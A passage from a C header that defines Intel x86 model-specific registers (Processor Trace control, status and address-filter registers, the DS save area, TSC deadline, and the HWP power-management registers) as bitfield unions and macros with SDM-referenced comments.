         *          ECX=0):ECX.SNGLRGNOUT[bit 2] = 0 WRMSR to IA32_RTIT_CTL that sets this bit causes \#GP: If CPUID.(EAX=14H,
         *          ECX=0):ECX.TOPA[bit 0] = 0
         * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA))]
         */
        UINT64 Topa : 1;
#define IA32_RTIT_CTL_TOPA_BIT                                       8
#define IA32_RTIT_CTL_TOPA_FLAG                                      0x100
#define IA32_RTIT_CTL_TOPA_MASK                                      0x01
#define IA32_RTIT_CTL_TOPA(_)                                        (((_) >> 8) & 0x01)

        /**
         * @brief MTCEn
         *
         * [Bit 9] - 0: Disables MTC Packet.
         * - 1: Enables MTC Packet.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[3] = 1) Reserved if CPUID.(EAX=14H, ECX=0):EBX.MTC[bit 3] = 0
         * @see Vol3C[35.4.2.16(Overflow (OVF) Packet)]
         */
        UINT64 MtcEnabled : 1;
#define IA32_RTIT_CTL_MTC_ENABLED_BIT                                9
#define IA32_RTIT_CTL_MTC_ENABLED_FLAG                               0x200
#define IA32_RTIT_CTL_MTC_ENABLED_MASK                               0x01
#define IA32_RTIT_CTL_MTC_ENABLED(_)                                 (((_) >> 9) & 0x01)

        /**
         * @brief TSCEn
         *
         * [Bit 10] - 0: Disable TSC packets.
         * - 1: Enable TSC packets.
         *
         * @see Vol3C[35.4.2.11(Timestamp Counter (TSC) Packet)]
         */
        UINT64 TscEnabled : 1;
#define IA32_RTIT_CTL_TSC_ENABLED_BIT                                10
#define IA32_RTIT_CTL_TSC_ENABLED_FLAG                               0x400
#define IA32_RTIT_CTL_TSC_ENABLED_MASK                               0x01
#define IA32_RTIT_CTL_TSC_ENABLED(_)                                 (((_) >> 10) & 0x01)

        /**
         * @brief DisRETC
         *
         * [Bit 11] - 0: Enable RET compression.
         * - 1: Disable RET compression.
         *
         * @see Vol3C[35.2.1.2(Indirect Transfer COFI)]
         */
        UINT64 RetCompressionDisabled : 1;
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_BIT                   11
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_FLAG                  0x800
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED_MASK                  0x01
#define IA32_RTIT_CTL_RET_COMPRESSION_DISABLED(_)                    (((_) >> 11) & 0x01)

        /**
         * @brief PTWEn
         *
         * [Bit 12] - 0: PTWRITE packet generation disabled.
         * - 1: PTWRITE packet generation enabled.
         */
        UINT64 PtwEnabled : 1;
#define IA32_RTIT_CTL_PTW_ENABLED_BIT                                12
#define IA32_RTIT_CTL_PTW_ENABLED_FLAG                               0x1000
#define IA32_RTIT_CTL_PTW_ENABLED_MASK                               0x01
#define IA32_RTIT_CTL_PTW_ENABLED(_)                                 (((_) >> 12) & 0x01)

        /**
         * @brief BranchEn
         *
         * [Bit 13] - 0: Disable COFI-based packets.
         * - 1: Enable COFI-based packets: FUP, TIP, TIP.PGE, TIP.PGD, TNT, MODE.Exec, MODE.TSX.
         *
         * @see Vol3C[35.2.5.4(Branch Enable (BranchEn))]
         */
        UINT64 BranchEnabled : 1;
#define IA32_RTIT_CTL_BRANCH_ENABLED_BIT                             13
#define IA32_RTIT_CTL_BRANCH_ENABLED_FLAG                            0x2000
#define IA32_RTIT_CTL_BRANCH_ENABLED_MASK                            0x01
#define IA32_RTIT_CTL_BRANCH_ENABLED(_)                              (((_) >> 13) & 0x01)

        /**
         * @brief MTCFreq
         *
         * [Bits 17:14] Defines MTC packet Frequency, which is based on the core crystal clock, or Always Running Timer (ART). MTC
         * will be sent each time the selected ART bit toggles. The following Encodings are defined:
         * 0: ART(0), 1: ART(1), 2: ART(2), 3: ART(3), 4: ART(4), 5: ART(5), 6: ART(6), 7: ART(7), 8: ART(8), 9: ART(9), 10:
         * ART(10), 11: ART(11), 12: ART(12), 13: ART(13), 14: ART(14), 15: ART(15)
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[3] = 1) Reserved if CPUID.(EAX=14H, ECX=0):EBX.MTC[bit 3] = 0
         * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
         */
        UINT64 MtcFrequency : 4;
#define IA32_RTIT_CTL_MTC_FREQUENCY_BIT                              14
#define IA32_RTIT_CTL_MTC_FREQUENCY_FLAG                             0x3C000
#define IA32_RTIT_CTL_MTC_FREQUENCY_MASK                             0x0F
#define IA32_RTIT_CTL_MTC_FREQUENCY(_)                               (((_) >> 14) & 0x0F)
        UINT64 Reserved1 : 1;

        /**
         * @brief CYCThresh
         *
         * [Bits 22:19] CYC packet threshold. CYC packets will be sent with the first eligible packet after N cycles have passed
         * since the last CYC packet. If CycThresh is 0 then N=0, otherwise N is defined as 2(CycThresh-1). The following Encodings
         * are defined:
         * 0: 0, 1: 1, 2: 2, 3: 4, 4: 8, 5: 16, 6: 32, 7: 64, 8: 128, 9: 256, 10: 512, 11: 1024, 12: 2048, 13: 4096, 14: 8192, 15:
         * 16384
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] = 1) Reserved if CPUID.(EAX=14H, ECX=0):EBX.CPSB_CAM[bit 1] = 0
         * @see Vol3C[35.3.6(Cycle-Accurate Mode)]
         * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
         */
        UINT64 CycThreshold : 4;
#define IA32_RTIT_CTL_CYC_THRESHOLD_BIT                              19
#define IA32_RTIT_CTL_CYC_THRESHOLD_FLAG                             0x780000
#define IA32_RTIT_CTL_CYC_THRESHOLD_MASK                             0x0F
#define IA32_RTIT_CTL_CYC_THRESHOLD(_)                               (((_) >> 19) & 0x0F)
        UINT64 Reserved2 : 1;

        /**
         * @brief PSBFreq
         *
         * [Bits 27:24] Indicates the frequency of PSB packets. PSB packet frequency is based on the number of Intel PT packet
         * bytes output, so this field allows the user to determine the increment of IA32_IA32_RTIT_STATUS.PacketByteCnt that
         * should cause a PSB to be generated. Note that PSB insertion is not precise, but the average output bytes per PSB should
         * approximate the SW selected period. The following Encodings are defined:
         * 0: 2K, 1: 4K, 2: 8K, 3: 16K, 4: 32K, 5: 64K, 6: 128K, 7: 256K, 8: 512K, 9: 1M, 10: 2M, 11: 4M, 12: 8M, 13: 16M, 14: 32M,
         * 15: 64M
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] = 1) Reserved if CPUID.(EAX=14H, ECX=0):EBX.CPSB_CAM[bit 1] = 0
         * @see Vol3C[35.3.1(Detection of Intel Processor Trace and Capability Enumeration)]
         */
        UINT64 PsbFrequency : 4;
#define IA32_RTIT_CTL_PSB_FREQUENCY_BIT                              24
#define IA32_RTIT_CTL_PSB_FREQUENCY_FLAG                             0xF000000
#define IA32_RTIT_CTL_PSB_FREQUENCY_MASK                             0x0F
#define IA32_RTIT_CTL_PSB_FREQUENCY(_)                               (((_) >> 24) & 0x0F)
        UINT64 Reserved3 : 4;

        /**
         * @brief ADDR0_CFG
         *
         * [Bits 35:32] Configures the base/limit register pair IA32_RTIT_ADDR0_A/B based on the following encodings:
         * - 0: ADDR0 range unused.
         * - 1: The [IA32_RTIT_ADDR0_A..IA32_RTIT_ADDR0_B] range defines a FilterEn range. FilterEn will only be set when the IP is
         * within this range, though other FilterEn ranges can additionally be used.
         * - 2: The [IA32_RTIT_ADDR0_A..IA32_RTIT_ADDR0_B] range defines a TraceStop range. TraceStop will be asserted if code
         * branches into this range.
         * - 3..15: Reserved (\#GP).
         *
         * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 0) Reserved if CPUID.(EAX=14H, ECX=1):EBX.RANGECNT[2:0] >= 0
         * @see Vol3C[35.2.4.3(Filtering by IP)]
         * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
         */
        UINT64 Addr0Cfg : 4;
#define IA32_RTIT_CTL_ADDR0_CFG_BIT                                  32
#define IA32_RTIT_CTL_ADDR0_CFG_FLAG                                 0xF00000000
#define IA32_RTIT_CTL_ADDR0_CFG_MASK                                 0x0F
#define IA32_RTIT_CTL_ADDR0_CFG(_)                                   (((_) >> 32) & 0x0F)

        /**
         * @brief ADDR1_CFG
         *
         * [Bits 39:36] Configures the base/limit register pair IA32_RTIT_ADDR1_A/B based on the following encodings:
         * - 0: ADDR1 range unused.
         * - 1: The [IA32_RTIT_ADDR1_A..IA32_RTIT_ADDR1_B] range defines a FilterEn range. FilterEn will only be set when the IP is
         * within this range, though other FilterEn ranges can additionally be used.
         * - 2: The [IA32_RTIT_ADDR1_A..IA32_RTIT_ADDR1_B] range defines a TraceStop range. TraceStop will be asserted if code
         * branches into this range.
         * - 3..15: Reserved (\#GP).
         *
         * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 1) Reserved if CPUID.(EAX=14H, ECX=1):EBX.RANGECNT[2:0] < 2
         * @see Vol3C[35.2.4.3(Filtering by IP)]
         * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
         */
        UINT64 Addr1Cfg : 4;
#define IA32_RTIT_CTL_ADDR1_CFG_BIT                                  36
#define IA32_RTIT_CTL_ADDR1_CFG_FLAG                                 0xF000000000
#define IA32_RTIT_CTL_ADDR1_CFG_MASK                                 0x0F
#define IA32_RTIT_CTL_ADDR1_CFG(_)                                   (((_) >> 36) & 0x0F)

        /**
         * @brief ADDR2_CFG
         *
         * [Bits 43:40] Configures the base/limit register pair IA32_RTIT_ADDR2_A/B based on the following encodings:
         * - 0: ADDR2 range unused.
         * - 1: The [IA32_RTIT_ADDR2_A..IA32_RTIT_ADDR2_B] range defines a FilterEn range. FilterEn will only be set when the IP is
         * within this range, though other FilterEn ranges can additionally be used.
         * - 2: The [IA32_RTIT_ADDR2_A..IA32_RTIT_ADDR2_B] range defines a TraceStop range. TraceStop will be asserted if code
         * branches into this range.
         * - 3..15: Reserved (\#GP).
         *
         * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 2) Reserved if CPUID.(EAX=14H, ECX=1):EBX.RANGECNT[2:0] < 3
         * @see Vol3C[35.2.4.3(Filtering by IP)]
         * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
         */
        UINT64 Addr2Cfg : 4;
#define IA32_RTIT_CTL_ADDR2_CFG_BIT                                  40
#define IA32_RTIT_CTL_ADDR2_CFG_FLAG                                 0xF0000000000
#define IA32_RTIT_CTL_ADDR2_CFG_MASK                                 0x0F
#define IA32_RTIT_CTL_ADDR2_CFG(_)                                   (((_) >> 40) & 0x0F)

        /**
         * @brief ADDR3_CFG
         *
         * [Bits 47:44] Configures the base/limit register pair IA32_RTIT_ADDR3_A/B based on the following encodings:
         * - 0: ADDR3 range unused.
         * - 1: The [IA32_RTIT_ADDR3_A..IA32_RTIT_ADDR3_B] range defines a FilterEn range. FilterEn will only be set when the IP is
         * within this range, though other FilterEn ranges can additionally be used.
         * - 2: The [IA32_RTIT_ADDR3_A..IA32_RTIT_ADDR3_B] range defines a TraceStop range. TraceStop will be asserted if code
         * branches into this range.
         * - 3..15: Reserved (\#GP).
         *
         * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > 3) Reserved if CPUID.(EAX=14H, ECX=1):EBX.RANGECNT[2:0] < 4
         * @see Vol3C[35.2.4.3(Filtering by IP)]
         * @see Vol3C[35.4.2.10(Core:Bus Ratio (CBR) Packet)]
         */
        UINT64 Addr3Cfg : 4;
#define IA32_RTIT_CTL_ADDR3_CFG_BIT                                  44
#define IA32_RTIT_CTL_ADDR3_CFG_FLAG                                 0xF00000000000
#define IA32_RTIT_CTL_ADDR3_CFG_MASK                                 0x0F
#define IA32_RTIT_CTL_ADDR3_CFG(_)                                   (((_) >> 44) & 0x0F)
        UINT64 Reserved4 : 8;

        /**
         * @brief InjectPsbPmiOnEnable
         *
         * [Bit 56] - 1: Enables use of IA32_RTIT_STATUS bits PendPSB[6] and PendTopaPMI[7].
         * - 0: IA32_RTIT_STATUS bits 6 and 7 are ignored.
         *
         * @remarks Reserved if CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 0
         * @see Vol3C[35.2.7.4(IA32_RTIT_STATUS MSR)]
         */
        UINT64 InjectPsbPmiOnEnable : 1;
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_BIT                   56
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_FLAG                  0x100000000000000
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE_MASK                  0x01
#define IA32_RTIT_CTL_INJECT_PSB_PMI_ON_ENABLE(_)                    (((_) >> 56) & 0x01)
        UINT64 Reserved5 : 7;
    };

    UINT64 Flags;
} IA32_RTIT_CTL_REGISTER;


/**
 * Tracing Status Register.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 */
#define IA32_RTIT_STATUS                                             0x00000571
typedef union
{
    struct
    {
        /**
         * @brief FilterEn (writes ignored)
         *
         * [Bit 0] This bit is written by the processor, and indicates that tracing is allowed for the current IP. Writes are
         * ignored.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[2] = 1)
         * @see Vol3C[35.2.5.5(Filter Enable (FilterEn))]
         */
        UINT64 FilterEnabled : 1;
#define IA32_RTIT_STATUS_FILTER_ENABLED_BIT                          0
#define IA32_RTIT_STATUS_FILTER_ENABLED_FLAG                         0x01
#define IA32_RTIT_STATUS_FILTER_ENABLED_MASK                         0x01
#define IA32_RTIT_STATUS_FILTER_ENABLED(_)                           (((_) >> 0) & 0x01)

        /**
         * @brief ContexEn (writes ignored)
         *
         * [Bit 1] The processor sets this bit to indicate that tracing is allowed for the current context. Writes are ignored.
         *
         * @see Vol3C[35.2.5.3(Context Enable (ContextEn))]
         */
        UINT64 ContextEnabled : 1;
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_BIT                         1
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_FLAG                        0x02
#define IA32_RTIT_STATUS_CONTEXT_ENABLED_MASK                        0x01
#define IA32_RTIT_STATUS_CONTEXT_ENABLED(_)                          (((_) >> 1) & 0x01)

        /**
         * @brief TriggerEn (writes ignored)
         *
         * [Bit 2] The processor sets this bit to indicate that tracing is enabled. Writes are ignored.
         *
         * @see Vol3C[35.2.5.2(Trigger Enable (TriggerEn))]
         */
        UINT64 TriggerEnabled : 1;
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_BIT                         2
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_FLAG                        0x04
#define IA32_RTIT_STATUS_TRIGGER_ENABLED_MASK                        0x01
#define IA32_RTIT_STATUS_TRIGGER_ENABLED(_)                          (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief Error
         *
         * [Bit 4] The processor sets this bit to indicate that an operational error has been encountered. When this bit is set,
         * TriggerEn is cleared to 0 and packet generation is disabled.
         * When TraceEn is cleared, software can write this bit. Once it is set, only software can clear it. It is not recommended
         * that software ever set this bit, except in cases where it is restoring a prior saved state.
         *
         * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA Errors)]
         */
        UINT64 Error : 1;
#define IA32_RTIT_STATUS_ERROR_BIT                                   4
#define IA32_RTIT_STATUS_ERROR_FLAG                                  0x10
#define IA32_RTIT_STATUS_ERROR_MASK                                  0x01
#define IA32_RTIT_STATUS_ERROR(_)                                    (((_) >> 4) & 0x01)

        /**
         * @brief Stopped
         *
         * [Bit 5] The processor sets this bit to indicate that a ToPA Stop condition has been encountered. When this bit is set,
         * TriggerEn is cleared to 0 and packet generation is disabled.
         * When TraceEn is cleared, software can write this bit. Once it is set, only software can clear it. It is not recommended
         * that software ever set this bit, except in cases where it is restoring a prior saved state.
         *
         * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA STOP)]
         */
        UINT64 Stopped : 1;
#define IA32_RTIT_STATUS_STOPPED_BIT                                 5
#define IA32_RTIT_STATUS_STOPPED_FLAG                                0x20
#define IA32_RTIT_STATUS_STOPPED_MASK                                0x01
#define IA32_RTIT_STATUS_STOPPED(_)                                  (((_) >> 5) & 0x01)

        /**
         * @brief Pend PSB
         *
         * [Bit 6] If IA32_RTIT_CTL.InjectPsbPmiOnEnable[56] = 1, the processor sets this bit when the threshold for a PSB+ to be
         * inserted has been reached. The processor will clear this bit when the PSB+ has been inserted into the trace. If PendPSB
         * = 1 and InjectPsbPmiOnEnable = 1 when IA32_RTIT_CTL.TraceEn[0] transitions from 0 to 1, a PSB+ will be inserted into the
         * trace.
         *
         * @remarks If CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 1
         */
        UINT64 PendPsb : 1;
#define IA32_RTIT_STATUS_PEND_PSB_BIT                                6
#define IA32_RTIT_STATUS_PEND_PSB_FLAG                               0x40
#define IA32_RTIT_STATUS_PEND_PSB_MASK                               0x01
#define IA32_RTIT_STATUS_PEND_PSB(_)                                 (((_) >> 6) & 0x01)

        /**
         * @brief Pend ToPA PMI
         *
         * [Bit 7] If IA32_RTIT_CTL.InjectPsbPmiOnEnable[56] = 1, the processor sets this bit when the threshold for a ToPA PMI to
         * be inserted has been reached. Software should clear this bit once the ToPA PMI has been handled. If PendTopaPMI = 1 and
         * InjectPsbPmiOnEnable = 1 when IA32_RTIT_CTL.TraceEn[0] transitions from 0 to 1, a PMI will be pended.
         *
         * @remarks If CPUID.(EAX=14H, ECX=0):EBX.INJECTPSBPMI[6] = 1
         * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA) | ToPA PMI)]
         */
        UINT64 PendTopaPmi : 1;
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_BIT                           7
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_FLAG                          0x80
#define IA32_RTIT_STATUS_PEND_TOPA_PMI_MASK                          0x01
#define IA32_RTIT_STATUS_PEND_TOPA_PMI(_)                            (((_) >> 7) & 0x01)
        UINT64 Reserved2 : 24;

        /**
         * @brief PacketByteCnt
         *
         * [Bits 48:32] This field is written by the processor, and holds a count of packet bytes that have been sent out. The
         * processor also uses this field to determine when the next PSB packet should be inserted. Note that the processor may
         * clear or modify this field at any time while IA32_RTIT_CTL.TraceEn=1. It will have a stable value when
         * IA32_RTIT_CTL.TraceEn=0.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[1] > 3)
         * @see Vol3C[35.4.2.17(Packet Stream Boundary (PSB) Packet)]
         */
        UINT64 PacketByteCount : 17;
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_BIT                       32
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_FLAG                      0x1FFFF00000000
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT_MASK                      0x1FFFF
#define IA32_RTIT_STATUS_PACKET_BYTE_COUNT(_)                        (((_) >> 32) & 0x1FFFF)
        UINT64 Reserved3 : 15;
    };

    UINT64 Flags;
} IA32_RTIT_STATUS_REGISTER;


/**
 * @brief Trace Filter CR3 Match Register <b>(R/W)</b>
 *
 * The IA32_RTIT_CR3_MATCH register is compared against CR3 when IA32_RTIT_CTL.CR3Filter is 1. Bits 63:5 hold the CR3
 * address value to match, bits 4:0 are reserved to 0.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 * @see Vol3C[35.2.4.2(Filtering by CR3)]
 * @see Vol3C[35.2.7.6(IA32_RTIT_CR3_MATCH MSR)] (reference)
 */
#define IA32_RTIT_CR3_MATCH                                          0x00000572
typedef union
{
    struct
    {
        UINT64 Reserved1 : 5;

        /**
         * [Bits 63:5] CR3[63:5] value to match.
         */
        UINT64 Cr3ValueToMatch : 59;
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_BIT                   5
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_FLAG                  0xFFFFFFFFFFFFFFE0
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH_MASK                  0x7FFFFFFFFFFFFFF
#define IA32_RTIT_CR3_MATCH_CR3_VALUE_TO_MATCH(_)                    (((_) >> 5) & 0x7FFFFFFFFFFFFFF)
    };

    UINT64 Flags;
} IA32_RTIT_CR3_MATCH_REGISTER;

/**
 * @defgroup IA32_RTIT_ADDR \
 *           IA32_RTIT_ADDR(x)
 *
 * The role of the IA32_RTIT_ADDRn_A/B register pairs, for each n, is determined by the corresponding ADDRn_CFG fields in
 * IA32_RTIT_CTL. The number of these register pairs is enumerated by CPUID.(EAX=14H, ECX=1):EAX.RANGECNT[2:0].
 *
 * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
 * @see Vol3C[35.2.7.2(IA32_RTIT_CTL MSR)]
 * @see Vol3C[35.2.7.5(IA32_RTIT_ADDRn_A and IA32_RTIT_ADDRn_B MSRs)] (reference)
 * @{
 */
 /**
  * @defgroup IA32_RTIT_ADDR_A \
  *           IA32_RTIT_ADDR(n)_A
  *
  * Region n Start Address.
  *
  * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
  * @{
  */
#define IA32_RTIT_ADDR0_A                                            0x00000580
#define IA32_RTIT_ADDR1_A                                            0x00000582
#define IA32_RTIT_ADDR2_A                                            0x00000584
#define IA32_RTIT_ADDR3_A                                            0x00000586
  /**
   * @}
   */

   /**
    * @defgroup IA32_RTIT_ADDR_B \
    *           IA32_RTIT_ADDR(n)_B
    *
    * Region n End Address.
    *
    * @remarks If (CPUID.(EAX=07H, ECX=1):EAX[2:0] > n)
    * @{
    */
#define IA32_RTIT_ADDR0_B                                            0x00000581
#define IA32_RTIT_ADDR1_B                                            0x00000583
#define IA32_RTIT_ADDR2_B                                            0x00000585
#define IA32_RTIT_ADDR3_B                                            0x00000587
    /**
     * @}
     */

typedef union
{
    struct
    {
        /**
         * [Bits 47:0] Virtual Address.
         */
        UINT64 VirtualAddress : 48;
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_BIT                           0
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_FLAG                          0xFFFFFFFFFFFF
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS_MASK                          0xFFFFFFFFFFFF
#define IA32_RTIT_ADDR_VIRTUAL_ADDRESS(_)                            (((_) >> 0) & 0xFFFFFFFFFFFF)

        /**
         * [Bits 63:48] SignExt_VA.
         */
        UINT64 SignExtVa : 16;
#define IA32_RTIT_ADDR_SIGN_EXT_VA_BIT                               48
#define IA32_RTIT_ADDR_SIGN_EXT_VA_FLAG                              0xFFFF000000000000
#define IA32_RTIT_ADDR_SIGN_EXT_VA_MASK                              0xFFFF
#define IA32_RTIT_ADDR_SIGN_EXT_VA(_)                                (((_) >> 48) & 0xFFFF)
    };

    UINT64 Flags;
} IA32_RTIT_ADDR_REGISTER;

/**
 * @}
 */


 /**
  * DS Save Area. Points to the linear address of the first byte of the DS buffer management area, which is used to manage
  * the BTS and PEBS buffers.
  * Returns:
  * - [63:0] The linear address of the first byte of the DS buffer management area, if IA-32e mode is active.
  * - [31:0] The linear address of the first byte of the DS buffer management area, if not in IA-32e mode.
  * - [63:32] Reserved if not in IA-32e mode.
  *
  * @remarks If CPUID.01H:EDX.DS[21] = 1
  * @see Vol3B[18.6.3.4(Debug Store (DS) Mechanism)]
  */
#define IA32_DS_AREA                                                 0x00000600

  /**
   * TSC Target of Local APIC's TSC Deadline Mode.
   *
   * @remarks If CPUID.01H:ECX.[24] = 1
   */
#define IA32_TSC_DEADLINE                                            0x000006E0

   /**
    * Enable/disable HWP.
    *
    * @remarks If CPUID.06H:EAX.[7] = 1
    */
#define IA32_PM_ENABLE                                               0x00000770
typedef union
{
    struct
    {
        /**
         * [Bit 0] HWP_ENABLE.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.2(Enabling HWP)]
         */
        UINT64 HwpEnable : 1;
#define IA32_PM_ENABLE_HWP_ENABLE_BIT                                0
#define IA32_PM_ENABLE_HWP_ENABLE_FLAG                               0x01
#define IA32_PM_ENABLE_HWP_ENABLE_MASK                               0x01
#define IA32_PM_ENABLE_HWP_ENABLE(_)                                 (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_PM_ENABLE_REGISTER;


/**
 * HWP Performance Range Enumeration.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_CAPABILITIES                                        0x00000771
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Highest_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
         */
        UINT64 HighestPerformance : 8;
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_BIT                0
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_FLAG               0xFF
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE_MASK               0xFF
#define IA32_HWP_CAPABILITIES_HIGHEST_PERFORMANCE(_)                 (((_) >> 0) & 0xFF)

        /**
         * [Bits 15:8] Guaranteed_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
         */
        UINT64 GuaranteedPerformance : 8;
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_BIT             8
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_FLAG            0xFF00
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE_MASK            0xFF
#define IA32_HWP_CAPABILITIES_GUARANTEED_PERFORMANCE(_)              (((_) >> 8) & 0xFF)

        /**
         * [Bits 23:16] Most_Efficient_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
         */
        UINT64 MostEfficientPerformance : 8;
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_BIT         16
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_FLAG        0xFF0000
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE_MASK        0xFF
#define IA32_HWP_CAPABILITIES_MOST_EFFICIENT_PERFORMANCE(_)          (((_) >> 16) & 0xFF)

        /**
         * [Bits 31:24] Lowest_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.3(HWP Performance Range and Dynamic Capabilities)]
         */
        UINT64 LowestPerformance : 8;
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_BIT                 24
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_FLAG                0xFF000000
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE_MASK                0xFF
#define IA32_HWP_CAPABILITIES_LOWEST_PERFORMANCE(_)                  (((_) >> 24) & 0xFF)
        UINT64 Reserved1 : 32;
    };

    UINT64 Flags;
} IA32_HWP_CAPABILITIES_REGISTER;


/**
 * Power Management Control Hints for All Logical Processors in a Package.
 *
 * @remarks If CPUID.06H:EAX.[11] = 1
 */
#define IA32_HWP_REQUEST_PKG                                         0x00000772
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Minimum_Performance.
         *
         * @remarks If CPUID.06H:EAX.[11] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 MinimumPerformance : 8;
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_BIT                 0
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_FLAG                0xFF
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE_MASK                0xFF
#define IA32_HWP_REQUEST_PKG_MINIMUM_PERFORMANCE(_)                  (((_) >> 0) & 0xFF)

        /**
         * [Bits 15:8] Maximum_Performance.
         *
         * @remarks If CPUID.06H:EAX.[11] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 MaximumPerformance : 8;
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_BIT                 8
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_FLAG                0xFF00
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE_MASK                0xFF
#define IA32_HWP_REQUEST_PKG_MAXIMUM_PERFORMANCE(_)                  (((_) >> 8) & 0xFF)

        /**
         * [Bits 23:16] Desired_Performance.
         *
         * @remarks If CPUID.06H:EAX.[11] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 DesiredPerformance : 8;
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_BIT                 16
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_FLAG                0xFF0000
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE_MASK                0xFF
#define IA32_HWP_REQUEST_PKG_DESIRED_PERFORMANCE(_)                  (((_) >> 16) & 0xFF)

        /**
         * [Bits 31:24] Energy_Performance_Preference.
         *
         * @remarks If CPUID.06H:EAX.[11] = 1 && CPUID.06H:EAX.[10] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 EnergyPerformancePreference : 8;
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_BIT       24
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_FLAG      0xFF000000
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE_MASK      0xFF
#define IA32_HWP_REQUEST_PKG_ENERGY_PERFORMANCE_PREFERENCE(_)        (((_) >> 24) & 0xFF)

        /**
         * [Bits 41:32] Activity_Window.
         *
         * @remarks If CPUID.06H:EAX.[11] = 1 && CPUID.06H:EAX.[9] = 1
